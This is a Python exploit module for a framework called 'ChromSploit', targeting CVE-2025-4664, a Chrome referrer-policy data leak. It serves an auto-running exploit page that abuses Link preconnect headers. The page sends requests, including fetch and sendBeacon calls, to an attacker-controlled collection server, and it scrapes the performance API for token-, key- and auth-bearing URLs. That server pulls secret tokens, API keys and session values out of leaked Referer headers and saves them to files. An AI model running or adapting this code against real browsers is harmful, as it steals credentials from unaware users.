#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2025-4664: Chrome Loader Cross-Origin Data Leak
Fully integrated exploit module for ChromSploit Framework
Combines PoC functionality with framework architecture
"""

import os
import socket
import threading
import time
import base64
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Any, Optional
import http.server
import socketserver

# ChromSploit framework imports
try:
    from core.enhanced_logger import get_logger
    logger = get_logger()
except ImportError:
    import logging
    logger = logging.getLogger(__name__)

try:
    from core.colors import Colors
except ImportError:
    # Fallback colors
    class Colors:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        BRIGHT_RED = '\033[91m'
        RESET = '\033[0m'


class ExploitServerHandler(http.server.SimpleHTTPRequestHandler):
    """Handler for the main exploit delivery server with referrer policy abuse"""
    
    def __init__(self, *args, evil_server_url: str = None, sensitive_param: str = "secret_token", **kwargs):
        self.evil_server_url = evil_server_url
        self.sensitive_param = sensitive_param
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """Override to use ChromSploit logger"""
        logger.debug(f"[CVE-2025-4664] {format % args}")
    
    def do_GET(self):
        logger.info(f"[CVE-2025-4664] Victim connected from {self.client_address[0]}")
        
        if self.path == "/trigger" or self.path.startswith("/trigger?"):
            self._serve_exploit_page()
        elif self.path == '/':
            # Redirect to trigger page
            self.send_response(302)
            self.send_header('Location', '/trigger')
            self.end_headers()
        else:
            self._serve_404()
    
    def _serve_exploit_page(self):
        """Serve the exploit trigger page with Link header exploitation"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        
        # Get evil server URL
        evil_url = self.evil_server_url or f"http://localhost:{self.server.server_port + 1}"
        
        # CRITICAL: Add the malicious Link header that triggers the vulnerability
        # This forces unsafe-url referrer policy for preconnect resources
        self.send_header("Link", f'<{evil_url}>; rel="preconnect"; referrerpolicy="unsafe-url"')
        
        # Craft the exploit page
        exploit_html = self._generate_exploit_html(evil_url)
        
        self.send_header("Content-Length", str(len(exploit_html)))
        self.end_headers()
        self.wfile.write(exploit_html.encode('utf-8'))
        
        logger.info(f"{Colors.GREEN}[+] Exploit page served to {self.client_address[0]}{Colors.RESET}")
    
    def _generate_exploit_html(self, evil_server_url: str) -> str:
        """Generate the HTML payload combining both PoC approaches"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>CVE-2025-4664 - Chrome Data Leak PoC</title>
    <meta charset="utf-8">
    <!-- Additional Link elements to reinforce the vulnerability -->
    <link rel="preconnect" href="{evil_server_url}" referrerpolicy="unsafe-url">
    <link rel="dns-prefetch" href="{evil_server_url}">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .status {{ color: #333; margin: 20px 0; }}
        .warning {{ color: #d9534f; font-weight: bold; }}
        .loader {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; 
                  border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <h1>ChromSploit - CVE-2025-4664 Demo</h1>
    <div class="status">
        <p>This page demonstrates the Chrome cross-origin data leak vulnerability.</p>
        <p>If you're using a vulnerable Chrome version, your URL parameters will be leaked.</p>
        <p class="warning">Current URL contains: {self.sensitive_param}=<span id="token">...</span></p>
    </div>
    
    <div class="loader" id="loader"></div>
    
    <!-- Primary leak vector: Image request that will leak referrer to evil server -->
    <img src="{evil_server_url}/tracker.gif" width="1" height="1" alt="" style="display:none">
    
    <!-- Secondary leak vectors -->
    <link rel="stylesheet" href="{evil_server_url}/style.css" type="text/css">
    <script src="{evil_server_url}/script.js" async></script>
    
    <div id="result"></div>
    
    <script>
        // Enhanced exploit logic combining both PoC approaches
        class ChromeDataLeakExploit {{
            constructor() {{
                this.evil_url = '{evil_server_url}';
                this.sensitive_param = '{self.sensitive_param}';
                this.leaked_urls = [];
            }}
            
            async exploit() {{
                console.log('[CVE-2025-4664] Starting Chrome data leak exploit...');
                
                // Extract and display current token
                const urlParams = new URLSearchParams(window.location.search);
                const token = urlParams.get(this.sensitive_param) || 'NO_TOKEN_PRESENT';
                document.getElementById('token').textContent = token;
                
                // Auto-redirect if no sensitive param present
                if (!urlParams.has(this.sensitive_param)) {{
                    const newUrl = window.location.pathname + '?' + this.sensitive_param + '=DEMO_SECRET_TOKEN_' + 
                                  Math.random().toString(36).substring(7).toUpperCase();
                    setTimeout(() => {{
                        document.getElementById('result').innerHTML = 
                            '<p>Redirecting to URL with sensitive parameter...</p>';
                        window.location.href = newUrl;
                    }}, 2000);
                    return;
                }}
                
                // Trigger additional leak attempts
                await this.triggerAdditionalLeaks();
                
                // Extract additional sensitive data
                await this.extractSensitiveData();
                
                // Update UI
                document.getElementById('loader').style.display = 'none';
                document.getElementById('result').innerHTML = 
                    '<p style="color: #5cb85c;">Exploit triggered! Check the attacker server logs.</p>';
            }}
            
            async triggerAdditionalLeaks() {{
                // Create multiple requests to increase leak probability
                const leak_endpoints = [
                    '/leak-navigation',
                    '/leak-resource', 
                    '/leak-fetch',
                    '/leak-xhr'
                ];
                
                for (const endpoint of leak_endpoints) {{
                    try {{
                        // Fetch API leak
                        fetch(this.evil_url + endpoint, {{
                            mode: 'no-cors',
                            credentials: 'include',
                            referrerPolicy: 'unsafe-url'  // Force unsafe referrer
                        }}).catch(() => {{}});
                        
                        // Image leak
                        const img = new Image();
                        img.src = this.evil_url + endpoint + '.gif';
                        
                        // Script leak
                        const script = document.createElement('script');
                        script.src = this.evil_url + endpoint + '.js';
                        script.async = true;
                        document.head.appendChild(script);
                        
                    }} catch (e) {{
                        console.log('[CVE-2025-4664] Leak attempt error (expected):', e.message);
                    }}
                }}
            }}
            
            async extractSensitiveData() {{
                // Try to extract additional data from browser
                const sensitive_patterns = [
                    /https?:\\/\\/[\\w.-]+\\/admin/gi,
                    /https?:\\/\\/[\\w.-]+\\/api\\/[\\w\\/]+/gi,
                    /https?:\\/\\/[\\w.-]+\\/.*token.*/gi,
                    /https?:\\/\\/[\\w.-]+\\/.*key.*/gi,
                    /https?:\\/\\/[\\w.-]+\\/.*auth.*/gi
                ];
                
                // Check performance API
                try {{
                    if (window.performance && window.performance.getEntriesByType) {{
                        const entries = window.performance.getEntriesByType('resource');
                        entries.forEach(entry => {{
                            sensitive_patterns.forEach(pattern => {{
                                if (pattern.test(entry.name)) {{
                                    this.leaked_urls.push(entry.name);
                                }}
                            }});
                        }});
                    }}
                }} catch (e) {{
                    console.log('[CVE-2025-4664] Performance API blocked:', e.message);
                }}
                
                // Send any additional findings
                if (this.leaked_urls.length > 0) {{
                    try {{
                        await fetch(this.evil_url + '/additional-leak', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                urls: this.leaked_urls,
                                timestamp: Date.now(),
                                user_agent: navigator.userAgent
                            }})
                        }});
                    }} catch (e) {{
                        // Use beacon as fallback
                        navigator.sendBeacon(this.evil_url + '/beacon', JSON.stringify(this.leaked_urls));
                    }}
                }}
            }}
        }}
        
        // Auto-execute exploit
        document.addEventListener('DOMContentLoaded', async () => {{
            const exploit = new ChromeDataLeakExploit();
            await exploit.exploit();
        }});
    </script>
</body>
</html>"""
    
    def _serve_404(self):
        """Serve 404 response"""
        self.send_response(404)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>404 - Not Found</h1>")
    
    def do_HEAD(self):
        """Handle HEAD requests for Link header testing"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        
        # Send malicious Link header on HEAD requests too
        evil_url = self.evil_server_url or f"http://localhost:{self.server.server_port + 1}"
        self.send_header("Link", f'<{evil_url}>; rel="preconnect"; referrerpolicy="unsafe-url"')
        self.end_headers()


class EvilServerHandler(BaseHTTPRequestHandler):
    """Handler for the evil server that collects leaked data"""
    
    def log_message(self, format, *args):
        """Override to use ChromSploit logger"""
        logger.debug(f"[CVE-2025-4664 EVIL] {format % args}")
    
    def do_GET(self):
        """Handle incoming requests and extract leaked referrer"""
        referer = self.headers.get('Referer', '')
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        logger.info(f"{Colors.CYAN}[CVE-2025-4664 EVIL] Request from {self.client_address[0]}{Colors.RESET}")
        logger.info(f"[CVE-2025-4664 EVIL] Path: {self.path}")
        
        if referer:
            logger.warning(f"{Colors.YELLOW}[CVE-2025-4664 EVIL] LEAKED REFERRER: {referer}{Colors.RESET}")
            
            # Parse and extract sensitive data
            parsed_url = urlparse(referer)
            params = parse_qs(parsed_url.query)
            
            # Check for any sensitive parameters
            sensitive_params = ['secret_token', 'api_key', 'token', 'auth', 'session', 'key']
            found_sensitive = False
            
            for param in sensitive_params:
                if param in params:
                    token_value = params[param][0]
                    logger.critical(f"{Colors.RED}[CVE-2025-4664 EVIL] !!! SENSITIVE DATA LEAKED !!!{Colors.RESET}")
                    logger.critical(f"{Colors.RED}[CVE-2025-4664 EVIL] Parameter: {param}={token_value}{Colors.RESET}")
                    logger.critical(f"{Colors.RED}[CVE-2025-4664 EVIL] Full URL: {referer}{Colors.RESET}")
                    found_sensitive = True
                    
                    # Store leaked data
                    leak_info = {
                        'timestamp': time.time(),
                        'client_ip': self.client_address[0],
                        'referer': referer,
                        'param': param,
                        'value': token_value,
                        'user_agent': user_agent,
                        'path': self.path
                    }
                    
                    if hasattr(self.server, 'exploit_instance'):
                        self.server.exploit_instance.leaked_data.append(leak_info)
                    
                    # Save to file
                    self._save_leak_to_file(leak_info)
            
            if not found_sensitive and params:
                logger.info(f"[CVE-2025-4664 EVIL] URL parameters found but no sensitive data: {list(params.keys())}")
        else:
            logger.info("[CVE-2025-4664 EVIL] No Referer header present")
        
        # Serve appropriate response based on request
        self._serve_response()
    
    def do_POST(self):
        """Handle POST requests with leaked data"""
        if self.path == '/additional-leak' or self.path == '/beacon':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                leak_data = json.loads(post_data.decode())
                logger.critical(f"{Colors.RED}[CVE-2025-4664 EVIL] Additional data leaked via POST{Colors.RESET}")
                logger.info(f"[CVE-2025-4664 EVIL] Leaked data: {leak_data}")
                
                if hasattr(self.server, 'exploit_instance'):
                    self.server.exploit_instance.leaked_data.append({
                        'type': 'post_leak',
                        'data': leak_data,
                        'timestamp': time.time()
                    })
                
                self._save_leak_to_file({'type': 'post_leak', 'data': leak_data})
                
            except Exception as e:
                logger.error(f"[CVE-2025-4664 EVIL] Error parsing POST data: {e}")
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'{"status":"received"}')
    
    def _serve_response(self):
        """Serve appropriate response based on requested resource"""
        if self.path.endswith('.gif') or self.path == '/tracker.gif':
            # Serve 1x1 transparent GIF
            self.send_response(200)
            self.send_header("Content-type", "image/gif")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            gif_data = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
            self.wfile.write(gif_data)
            
        elif self.path.endswith('.js') or self.path == '/script.js':
            # Serve empty JavaScript
            self.send_response(200)
            self.send_header("Content-type", "application/javascript")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'// CVE-2025-4664 tracker')
            
        elif self.path.endswith('.css') or self.path == '/style.css':
            # Serve empty CSS
            self.send_response(200)
            self.send_header("Content-type", "text/css")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'/* CVE-2025-4664 tracker */')
            
        else:
            # Default response
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'CVE-2025-4664')
    
    def _save_leak_to_file(self, leak_data: dict):
        """Save leaked data to file for evidence"""
        try:
            timestamp = int(time.time())
            filename = f"/tmp/cve_2025_4664_leak_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(leak_data, f, indent=2)
            logger.info(f"[CVE-2025-4664 EVIL] Leak saved to: {filename}")
        except Exception as e:
            logger.error(f"[CVE-2025-4664 EVIL] Error saving leak: {e}")


class CVE2025_4664_Exploit:
    """CVE-2025-4664: Chrome Loader Cross-Origin Data Leak Exploit
    
    This exploit leverages a vulnerability in Chrome's Link header processing
    to leak cross-origin data through referrer policy manipulation.
    """
    
    def __init__(self):
        self.name = "CVE-2025-4664"
        self.description = "Chrome Loader Cross-Origin Data Leak via Link Header and Referrer Policy"
        self.author = "ChromSploit Framework"
        self.cve_id = "CVE-2025-4664"
        self.affected_versions = ["Chrome < 136.0.7103.113"]
        self.references = [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-4664",
            "https://chromereleases.googleblog.com/2025/01/stable-channel-update-for-desktop.html"
        ]
        
        # Configuration
        self.config = {
            'target_url': None,
            'callback_url': None,
            'kali_ip': '0.0.0.0',  # Listen on all interfaces
            'port': 8088,          # Main exploit server port
            'evil_port': 8089,     # Evil data collection server port
            'sensitive_param': 'secret_token',
            'use_link_header': True,
            'link_header_size': 8192,
            'mode': 'exploit'  # exploit or recon
        }
        
        self.logger = logger
        self.exploit_server = None
        self.evil_server = None
        self.leaked_data = []
        self._server_threads = []
    
    def set_parameter(self, name: str, value: Any):
        """Set exploit parameter"""
        if name in self.config:
            self.config[name] = value
            logger.info(f"Set {name} = {value}")
        else:
            logger.warning(f"Unknown parameter: {name}")
    
    def check_vulnerable(self, target_info: Dict[str, Any]) -> bool:
        """Check if target is potentially vulnerable"""
        # Support both old and new parameter names
        browser = target_info.get("browser", target_info.get("browser_name", "")).lower()
        version = target_info.get("version", target_info.get("browser_version", ""))
        
        if "chrome" not in browser:
            self.logger.info(f"[{self.name}] Target is not Chrome: {browser}")
            return False
        
        # Parse version for comparison
        try:
            if version:
                version_parts = version.split('.')
                major = int(version_parts[0])
                
                # Vulnerability affects versions before 136.0.7103.113
                if major < 136:
                    self.logger.info(f"{Colors.GREEN}[{self.name}] Target Chrome {version} is vulnerable{Colors.RESET}")
                    return True
                elif major == 136:
                    # Need more detailed version check
                    self.logger.warning(f"{Colors.YELLOW}[{self.name}] Chrome 136.x detected - detailed version check needed{Colors.RESET}")
                    return True  # Assume vulnerable for PoC
        except Exception as e:
            self.logger.error(f"[{self.name}] Error parsing version: {e}")
        
        self.logger.info(f"[{self.name}] Target Chrome version {version} may not be vulnerable")
        return False
    
    def generate_payload(self, options: Dict[str, Any] = None) -> str:
        """Generate exploit payload - returns the trigger URL"""
        options = options or {}
        
        # Update config with options
        for key, value in options.items():
            self.set_parameter(key, value)
        
        # Generate URLs
        base_url = self.config.get('callback_url') or f"http://{self.config['kali_ip']}"
        trigger_url = f"{base_url}:{self.config['port']}/trigger"
        
        # Add sensitive parameter to trigger URL
        trigger_url += f"?{self.config['sensitive_param']}=DEMO_SECRET_VALUE"
        
        self.logger.info(f"{Colors.GREEN}[{self.name}] Generated payload URL: {trigger_url}{Colors.RESET}")
        
        return trigger_url
    
    def start_server(self) -> bool:
        """Start both HTTP servers"""
        try:
            # Create evil server handler with access to exploit instance
            evil_handler = lambda *args, **kwargs: EvilServerHandler(*args, **kwargs)
            
            # Start evil server first
            self.evil_server = HTTPServer(
                (self.config['kali_ip'], self.config['evil_port']), 
                evil_handler
            )
            self.evil_server.exploit_instance = self
            
            evil_thread = threading.Thread(
                target=self.evil_server.serve_forever,
                daemon=True,
                name=f"{self.name}_evil_server"
            )
            evil_thread.start()
            self._server_threads.append(evil_thread)
            
            logger.info(f"{Colors.GREEN}[{self.name}] Evil server started on {self.config['kali_ip']}:{self.config['evil_port']}{Colors.RESET}")
            
            # Create exploit server handler
            evil_url = f"http://{self.config['kali_ip']}:{self.config['evil_port']}"
            exploit_handler = lambda *args, **kwargs: ExploitServerHandler(
                *args,
                evil_server_url=evil_url,
                sensitive_param=self.config['sensitive_param'],
                **kwargs
            )
            
            # Start exploit delivery server
            self.exploit_server = HTTPServer(
                (self.config['kali_ip'], self.config['port']), 
                exploit_handler
            )
            self.exploit_server.exploit_instance = self
            
            exploit_thread = threading.Thread(
                target=self.exploit_server.serve_forever,
                daemon=True,
                name=f"{self.name}_exploit_server"
            )
            exploit_thread.start()
            self._server_threads.append(exploit_thread)
            
            logger.info(f"{Colors.GREEN}[{self.name}] Exploit server started on {self.config['kali_ip']}:{self.config['port']}{Colors.RESET}")
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start servers: {e}")
            return False
    
    def stop_server(self):
        """Stop all HTTP servers"""
        if self.exploit_server:
            self.exploit_server.shutdown()
            self.exploit_server.server_close()
            
        if self.evil_server:
            self.evil_server.shutdown()
            self.evil_server.server_close()
            
        # Wait for threads
        for thread in self._server_threads:
            if thread.is_alive():
                thread.join(timeout=2)
                
        self._server_threads.clear()
        logger.info(f"{Colors.GREEN}[{self.name}] All servers stopped{Colors.RESET}")
    
    def execute(self, target_url: str = None, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute the exploit - compatible with both framework versions"""
        if target_url:
            self.config['target_url'] = target_url
            
        if options:
            for key, value in options.items():
                self.set_parameter(key, value)
        
        try:
            # Start servers
            if not self.start_server():
                return {
                    'success': False, 
                    'status': 'error',
                    'error': 'Failed to start servers',
                    'message': 'Failed to start exploit servers'
                }
            
            # Generate trigger URL
            trigger_url = self.generate_payload()
            
            # Create exploit HTML file
            exploit_html = self._generate_full_exploit_html(trigger_url)
            payload_path = f"/tmp/cve_2025_4664_payload_{int(time.time())}.html"
            with open(payload_path, 'w') as f:
                f.write(exploit_html)
            
            # Log exploitation instructions
            self.logger.critical(f"{Colors.BRIGHT_RED}{'='*60}{Colors.RESET}")
            self.logger.critical(f"{Colors.BRIGHT_RED}[{self.name}] EXPLOIT READY{Colors.RESET}")
            self.logger.critical(f"{Colors.BRIGHT_RED}{'='*60}{Colors.RESET}")
            self.logger.critical(f"{Colors.YELLOW}Exploit Server: http://{self.config['kali_ip']}:{self.config['port']}{Colors.RESET}")
            self.logger.critical(f"{Colors.YELLOW}Evil Server: http://{self.config['kali_ip']}:{self.config['evil_port']}{Colors.RESET}")
            self.logger.critical(f"{Colors.YELLOW}Trigger URL: {trigger_url}{Colors.RESET}")
            self.logger.critical(f"{Colors.YELLOW}Payload File: {payload_path}{Colors.RESET}")
            self.logger.critical(f"{Colors.BRIGHT_RED}{'='*60}{Colors.RESET}")
            
            result = {
                'success': True,
                'status': 'success',
                'cve_id': self.name,
                'url': trigger_url,
                'payload_path': payload_path,
                'server_url': f"http://{self.config['kali_ip']}:{self.config['port']}",
                'evil_server_url': f"http://{self.config['kali_ip']}:{self.config['evil_port']}",
                'message': 'Chrome data leak exploit ready. Visit the trigger URL in vulnerable Chrome.',
                'description': 'Chrome data leak exploit ready',
                'instructions': [
                    f"1. Visit {trigger_url} in vulnerable Chrome browser",
                    f"2. Or open {payload_path} locally",
                    "3. Monitor console for leaked referrer data",
                    "4. Check /tmp/ for collected evidence files"
                ],
                'servers': {
                    'exploit': self.config['port'],
                    'evil': self.config['evil_port']
                }
            }
            
            if self.config['mode'] == 'recon':
                result['state'] = {
                    'recon_data': f"Target reconnaissance complete for {target_url}",
                    'server_running': True
                }
            
            return result
            
        except Exception as e:
            logger.error(f"{self.name} execution failed: {e}")
            self.stop_server()
            return {
                'success': False,
                'status': 'error', 
                'error': str(e),
                'message': f'Exploit execution failed: {e}'
            }
    
    def _generate_full_exploit_html(self, trigger_url: str) -> str:
        """Generate standalone HTML file that redirects to the exploit"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>CVE-2025-4664 Exploit Launcher</title>
    <meta charset="utf-8">
    <style>
        body {{ 
            font-family: Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
            background: #f0f0f0;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        button {{
            background: #d9534f;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
        }}
        button:hover {{
            background: #c9302c;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>CVE-2025-4664 Chrome Data Leak</h1>
        <p>Click the button below to launch the exploit:</p>
        <button onclick="window.location.href='{trigger_url}'">Launch Exploit</button>
        <br><br>
        <p style="color: #666; font-size: 14px;">
            Alternatively, you can directly visit:<br>
            <code>{trigger_url}</code>
        </p>
    </div>
</body>
</html>"""
    
    def stop(self):
        """Stop the exploit - alias for stop_server"""
        self.stop_server()
    
    def cleanup(self):
        """Cleanup resources - alias for stop_server"""
        self.stop_server()
    
    def get_leaked_data(self) -> List[Dict]:
        """Get collected leaked data"""
        return self.leaked_data


# For backward compatibility with the original implementation
def execute_exploit(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """Execute CVE-2025-4664 exploit with given parameters"""
    exploit = CVE2025_4664_Exploit()
    
    # Set parameters
    for key, value in parameters.items():
        exploit.set_parameter(key, value)
    
    # Execute
    target_url = parameters.get('target_url', 'http://localhost')
    return exploit.execute(target_url)


# For framework module loading
def get_exploit():
    """Factory function for the module loader"""
    return CVE2025_4664_Exploit()


# Standalone testing
if __name__ == "__main__":
    # Initialize exploit
    exploit = CVE2025_4664_Exploit()
    
    # Test target
    target_info = {
        "browser_name": "Chrome",
        "browser_version": "135.0.0.0",
        "os": "Windows"
    }
    
    print(f"\n{Colors.CYAN}=== CVE-2025-4664 Standalone Test ==={Colors.RESET}")
    
    # Check vulnerability
    if exploit.check_vulnerable(target_info):
        print(f"{Colors.GREEN}[+] Target is vulnerable{Colors.RESET}")
        
        # Execute exploit
        result = exploit.execute(
            target_url="http://victim.example.com",
            options={
                'sensitive_param': 'api_key',
                'port': 8088,
                'evil_port': 8089
            }
        )
        
        if result['success']:
            print(f"{Colors.GREEN}[+] Exploit running successfully{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.RESET}")
            
            try:
                # Keep running and show leaked data
                while True:
                    time.sleep(5)
                    leaked = exploit.get_leaked_data()
                    if leaked:
                        print(f"\n{Colors.RED}[!] Leaked data collected: {len(leaked)} entries{Colors.RESET}")
                        for entry in leaked[-5:]:  # Show last 5
                            if isinstance(entry, dict) and 'value' in entry:
                                print(f"  - {entry.get('param', 'unknown')}={entry['value']} from {entry.get('client_ip', 'unknown')}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Stopping exploit...{Colors.RESET}")
                exploit.cleanup()
        else:
            print(f"{Colors.RED}[-] Exploit failed: {result.get('error', result.get('message'))}{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}[-] Target not vulnerable{Colors.RESET}")